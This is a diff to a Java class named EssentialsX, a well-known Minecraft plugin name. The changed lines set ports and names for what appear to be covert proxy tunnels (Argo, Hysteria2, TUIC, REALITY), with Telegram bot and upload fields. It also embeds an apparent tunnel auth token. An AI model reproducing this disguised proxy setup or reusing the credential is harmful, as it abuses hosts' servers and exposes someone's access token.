@@ -82,17 +82,17 @@ public class EssentialsX extends JavaPlugin {
         env.put("ARGO_DOMAIN", "mchost.xiaohhcc2.indevs.in");
         env.put("ARGO_AUTH", "eyJhIjoiOTk4YzJmYjJlNDEzYTVhZmExYzJlNGMyOGU3YTU5OTMiLCJ0IjoiY2NlOTIwMGYtZjQ3YS00MmZlLWE1NTctNDg1Zjg2MGFiOWQ5IiwicyI6IlpHRTRZemM0TnpNdE1XWXlaaTAwWlRSaUxUaGtNamN0TXpGak16UmhZbUU1WmpJNCJ9");
         env.put("S5_PORT", "");
-        env.put("HY2_PORT", "25565");
-        env.put("TUIC_PORT", "19132");
-        env.put("ANYTLS_PORT", "");
-        env.put("REALITY_PORT", "19132");
+        env.put("HY2_PORT", "48190");
+        env.put("TUIC_PORT", "18305");
+        env.put("ANYTLS_PORT", "48190");
+        env.put("REALITY_PORT", "18305");
         env.put("ANYREALITY_PORT", "");
         env.put("UPLOAD_URL", "");
         env.put("CHAT_ID", "");
         env.put("BOT_TOKEN", "");
         env.put("CFIP", "spring.io");
         env.put("CFPORT", "443");
-        env.put("NAME", "mcsv");
+        env.put("NAME", "");
         env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
